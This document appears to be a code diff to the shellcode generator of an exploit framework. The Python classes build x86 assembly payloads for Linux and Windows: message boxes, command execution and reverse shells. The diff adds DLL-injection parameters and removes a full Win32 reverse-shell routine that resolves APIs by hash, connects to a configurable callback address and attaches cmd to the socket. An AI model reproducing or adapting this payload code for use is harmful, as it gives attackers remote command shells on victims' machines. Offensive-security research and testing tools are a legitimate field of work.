@@ -18,7 +18,7 @@ class ShellGenerator:
             return
         self.OS_TARGET_ARCH = OS_TARGET_ARCH
     
-    def get_shellcode(self, type, message="", connectback_ip="127.0.0.1", connectback_port=5555, command="", make_exe=0, debug=0):
+    def get_shellcode(self, type, message="", connectback_ip="127.0.0.1", connectback_port=5555, command="", make_exe=0, debug=0, filename="payload", dll_inj_funcs=[]):
         if not self.target:
             print("Generating shellcodes for '%s' OS is not supported" % self.os_target)
             return None
@@ -30,22 +30,20 @@ class ShellGenerator:
 
 
         if type == "message":
-            code, need_to_build = self.target.message(message)
+            code = self.target.message(message)
         elif type == "reverse":
             if not connectback_ip or not connectback_port:
                 print "You must specify connectback params"
                 return None
-            code, need_to_build = self.target.reverse(connectback_ip, connectback_port)
+            code = self.target.reverse(connectback_ip, connectback_port)
         elif type == "command":
-            code, need_to_build = self.target.command(command)
+            code = self.target.command(command)
         else:
             return None
 
-        if need_to_build:
-            shell = create_shellcode(code, self.os_target, self.OS_TARGET_ARCH, make_exe, debug)
-        else:
-            shell = code
-        return shell
+
+        shell, filepath = create_shellcode(code, self.os_target, self.OS_TARGET_ARCH, make_exe, debug, filename, dll_inj_funcs)
+        return shell, filepath
 
 
 class LinuxShellcodes():
@@ -102,7 +100,7 @@ one:
 
         code = code.replace("MESSAGE", message)
         code = code.replace("LENGTH", str(len(message)))
-        return code, True
+        return code
 
     def reverse(self, connectback_ip, connectback_port):
         """
@@ -419,12 +417,13 @@ exec_shell:
 
         code = code.replace("CONNECTBACK_IP", connectback_ip_hex)
         code = code.replace("CONNECTBACK_PORT", connectback_port_hex)
-        return code, True
+        return code
 
 class WindowsShellcodes():
     def __init__(self, OS_TARGET_ARCH):
         self.shell_types = ["message", "reverse", "command"]
-        self.target_os = "WINDOWS"        
+        self.target_os = "WINDOWS"
+        self.target_arch = OS_TARGET_ARCH
 
     def message(self, message=''):
         """
@@ -436,7 +435,6 @@ class WindowsShellcodes():
 
         code = """
 global _start
-
 _start:
     ;eax holds return value
     ;ebx will hold function addresses
@@ -510,7 +508,7 @@ Message:
             address = hex(windll.kernel32.GetProcAddress(handle, func))
             code = code.replace("ADDR_" + func, str(address))
 
-        return code, True
+        return code
 
     def command(self, command='calc.exe', technique='PEB'):
         """
@@ -521,13 +519,9 @@ Message:
 
         if technique == 'SEH':
             code = """
-; Win32 API Loader
-
-[BITS 32]
-
 global _start
 _start:
-    call LKernel32Base
+    call start_main
 
 LGetProcAddress:
     push ebx
@@ -581,7 +575,7 @@ LDone:
     pop ebx
     ret 8
 
-LKernel32Base:
+start_main:
     pop esi
     push byte 0x30
     pop ecx
@@ -631,10 +625,7 @@ GetCommand:
 
         if technique == 'PEB':
             code = """
-[BITS 32]
-
 global _start
-
 _start:
     jmp start_main
 
@@ -747,309 +738,10 @@ ArgumentReturn:             ;calc.exe
             code = code.replace('HASH_CloseHandle', str(self.compute_hash_by('CloseHandle', 0xd)))
             code = code.replace('HASH_WinExec', str(self.compute_hash_by('WinExec', 0xd)))
             code = code.replace('HASH_ExitProcess', str(self.compute_hash_by('ExitProcess', 0xd)))
-        return code, True
-
-    def windows_reverse_shell(self, connectback_ip, connectback_port):
-        """
-            Get reverse shellcode for windows os
-        """
-
-        if not connectback_ip or not connectback_port:
-            print "You must specify some params"
-            return None
-
-        code = """
-; Win32 API Loader
-
-[BITS 32]
-
-global _start
-_start:
-
-    call LKernel32Base
-
-LGetProcAddress:
-    push ebx
-    push ebp
-    push esi
-    push edi
-    mov ebp, [esp + 24]
-    mov eax, [ebp + 0x3c]
-    mov edx, [ebp + eax + 120]
-    add edx, ebp
-    mov ecx, [edx + 24]
-    mov ebx, [edx + 32]
-    add ebx, ebp
-
-LFnlp:
-    jecxz LNtfnd
-    dec ecx
-    mov esi, [ebx + ecx * 4]
-    add esi, ebp
-    xor edi, edi
-    cld
-
-LHshlp:
-    xor eax, eax
-    lodsb
-    cmp al, ah
-    je LFnd
-    ror edi, 13
-    add edi, eax
-    jmp short LHshlp
-
-LFnd:
-    cmp edi, [esp + 20]
-    jnz LFnlp
-    mov ebx, [edx + 36]
-    add ebx, ebp
-    mov cx, [ebx + 2 * ecx]
-    mov ebx, [edx + 28]
-    add ebx, ebp
-    mov eax, [ebx + 4 * ecx]
-    add eax, ebp
-    jmp short LDone
-
-LNtfnd:
-    xor eax, eax
-
-LDone:
-    pop edi
-    pop esi
-    pop ebp
-    pop ebx
-    ret 8
-
-LKernel32Base:
-    pop esi
-    push byte 0x30
-    pop ecx
-    mov ebx, [fs:ecx]
-    mov ebx, [ebx + 0x0c]
-    mov ebx, [ebx + 0x1c]
-    mov ebx, [ebx]
-    mov ebx, [ebx + 0x08]
-
-    push ebx                ; kernel32.dll base
-    push HASH_LoadLibraryA  ; LoadLibraryA
-    call esi                ; GetProcAddress(kerne32.dll, LoadLibrary)
-    mov edi, eax
-
-    push ebx                ; kernel32.dll base
-    push HASH_VirtualAlloc  ; VirtualAlloc (0x91afca54)
-    call esi                ; GetProcAddress(kerne32.dll, VirtualAlloc)
-
-    ; ebx = kernel32.dll base
-    ; esi = LGetProcAddress
-    ; edi = LoadLibraryA
-    ; eax = VirtualAlloc
-
-"""
-        code = code.replace('HASH_LoadLibraryA', str(self.compute_hash_by('LoadLibraryA', 0xd)))
-        code = code.replace('HASH_VirtualAlloc', str(self.compute_hash_by('VirtualAlloc', 0xd)))
-
-        code += """
-; Win32 Socket Initialization (connect)
-
-sub esp, 0x100
-push eax    ; [ebp + 12] = VirtualAlloc
-push edi    ; [ebp +  8] = LoadLibraryA
-push esi    ; [ebp +  4] = LGetProcAddress
-push ebx    ; [ebp +  0] = kernel32.dll base
-
-mov ebp, esp
-call LLoadWinsock
-
-%define FN_RECV     [ebp + 24]
-%define FN_SEND     [ebp + 28]
-%define FN_CONNECT  [ebp + 32]
-%define FN_WSASOCK  [ebp + 36]
-%define FN_WSASTART [ebp + 40]
-
-LWSDataSegment:
-;========================
-dd 0x190            ; used by wsastartup
-dd HASH_recv        ; recv (0xe71819b6)        [ebp + 24]
-dd HASH_send        ; send (0xe97019a4 )        [ebp + 28]
-dd HASH_connect     ; connect (0x60aaf9ec)     [ebp + 32]
-dd HASH_WSASocketA  ; WSASocketA (0xadf509d9) [ebp + 36]
-dd HASH_WSAStartup  ; WSAStartup (0x3bfcedcb) [ebp + 40]
-db "WS2_32", 0x00
-;========================
-
-LLoadWinsock:
-    pop ebx             ; save address to data in ebx
-    lea ecx, [ebx + 24] ; find address of "WS2_32.DLL"
-    push ecx            ; push address of "WS2_32.DLL"
-    call edi            ; call LoadLibraryA("WS2_32.DLL")
-    mov edi, ebx        ; store base of data section in edi
-    mov ebx, eax        ; store base of winsock in ebx
-    lea esi, [ebp + 20] ; store base of function table
-    push byte 0x05      ; load five functions by hash
-    pop ecx             ; configure the counter
-
-Looper:
-    push ecx                    ; save the counter
-    push ebx                    ; dll handle
-    push dword [edi + ecx * 4]  ; function hash value
-    call [ebp + 4]              ; find the address
-    pop ecx                     ; restore the counter
-    mov [esi + ecx * 4], eax    ; stack segment to store addresses
-    loop Looper
-
-LWSAStartup:                    ; WSAStartup (0x101, DATA)
-    sub esp, [edi]
-    push esp
-    push dword [edi]
-    call FN_WSASTART
-    xor eax, eax
-
-LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0)
-    push eax
-    push eax
-    push eax
-    push eax
-    inc eax
-    push eax
-    inc eax
-    push eax
-    call FN_WSASOCK
-    mov edi, eax
-"""
-        code = code.replace('HASH_recv', str(self.compute_hash_by('recv', 0xd)))
-        code = code.replace('HASH_send', str(self.compute_hash_by('send', 0xd)))
-        code = code.replace('HASH_connect', str(self.compute_hash_by('connect', 0xd)))
-        code = code.replace('HASH_WSASocketA', str(self.compute_hash_by('WSASocketA', 0xd)))
-        code = code.replace('HASH_WSAStartup', str(self.compute_hash_by('WSAStartup', 0xd)))
-
-        code += """
-; Win32 Reverse Connect Payload
-; [ebp +  0] = kernel32.dll base
-; [ebp +  4] = LGetProcAddress
-; [ebp +  8] = LoadLibraryA
-; [ebp + 12] = VirtualAlloc
-; [ebp + 24] = recv
-; [ebp + 28] = send
-; [ebp + 32] = accept
-; [ebp + 36] = bind
-; [ebp + 40] = connect
-; [ebp + 44] = WSASocketA
-; [ebp + 48] = WSAStartup
-; [ebp + 52] = Payload Length
-
-LConnect:
-    push CONNECTBACK_IP     ; host: i.e. 127.0.0.1
-    push CONNECTBACK_PORT   ; port: i.e. 5555
-    mov ecx, esp
-    push byte 0x10
-    push ecx
-    push dword edi
-    call dword FN_CONNECT
-    pop ecx                 ; remove port
-    pop ecx                 ; remove host
-
-    ; reconnect on failure
-    ; test eax, eax
-    ; jne short LConnect
-"""
-
-        code += """
-; Win32 Network Shell
-; [ebp +  0] = kernel32.dll base
-; [ebp +  4] = LGetProcAddress
-; [ebp +  8] = LoadLibraryA
-; edi        = socket
-
-LSetCommand:
-    push "CMD"
-    mov ebx, esp
-
-LCreateProcessStructs:
-    xchg edi, edx       ; save edi to edx
-    xor eax,eax         ; overwrite with null
-    lea edi, [esp-84]   ; struct sizes
-    push byte 21        ; 21 * 4 = 84
-    pop ecx             ; set counter
-
-LBZero:
-    rep stosd       ; overwrite with null
-    xchg edi, edx   ; restore edi
-
-LCreateStructs:
-    sub esp, 84
-    mov byte [esp + 16], 68         ; si.cb = sizeof(si)
-    mov word [esp + 60], 0x0101     ; si.dwflags
-
-    ; socket handles
-    mov [esp + 16 + 56], edi
-    mov [esp + 16 + 60], edi
-    mov [esp + 16 + 64], edi
-
-    lea eax, [esp + 16]     ; si
-    push esp                ; pi
-    push eax
-    push ecx
-    push ecx
-    push ecx
-
-    inc ecx
-    push ecx
-    dec ecx
-
-    push ecx
-    push ecx
-    push ebx
-    push ecx
-
-LCreateProcessA:
-    push dword [ebp]            ; kernel32.dll
-    push HASH_CreateProcessA    ; CreateProcessA (0x16b3fe72)
-    call [ebp + 4]
-    call eax
-    mov esi, esp
-
-LWaitForSingleObject:
-    push dword [ebp]                ; kernel32.dll
-    push HASH_WaitForSingleObject   ; WaitForSingleObject (0xce05d9ad)
-    call [ebp + 4]
-    mov ebx, eax
-
-    push 0xFFFFFFFF
-    push dword [esi]
-    call ebx
-
-LDeathBecomesYou:
-    push dword [ebp]         ; kernel32.dll
-    push HASH_ExitProcess    ; ExitProcess (0x73e2d87e)
-    call [ebp + 4]
-
-    xor ebx, ebx
-    push ebx
-    call eax
-"""
-        code = code.replace('HASH_CreateProcessA', str(self.compute_hash_by('CreateProcessA', 0xd)))
-        code = code.replace('HASH_WaitForSingleObject', str(self.compute_hash_by('WaitForSingleObject', 0xd)))
-        code = code.replace('HASH_ExitProcess', str(self.compute_hash_by('ExitProcess', 0xd)))
-
-        connectback_ip_hex = '0x'
-        connectback_ip_arr = []
-        for i in connectback_ip.split('.'):
-            connectback_ip_arr.append('{:02X}'.format(int(i)))
-        for i in reversed(connectback_ip_arr):
-            connectback_ip_hex += i
-
-        connectback_port_hex = '0x' + '{:04X}'.format(connectback_port)[-2:]
-        connectback_port_hex += '{:04X}'.format(connectback_port)[:-2]
-        connectback_port_hex += '0002'
-
-        code = code.replace("CONNECTBACK_IP", connectback_ip_hex)
-        code = code.replace("CONNECTBACK_PORT", connectback_port_hex)
-
-        return code, True
+        return code
 
     def reverse(self, connectback_ip, connectback_port):
         code = """
-BITS 32
 global _start
 _start:
 	cld
@@ -1225,7 +917,7 @@ place9:
 
         code = code.replace("CONNECTBACK_IP", connectback_ip_hex)
         code = code.replace("CONNECTBACK_PORT", connectback_port_hex)
-        return code, True
+        return code
 
     def compute_hash_by(self, key, num=0xd):
         """
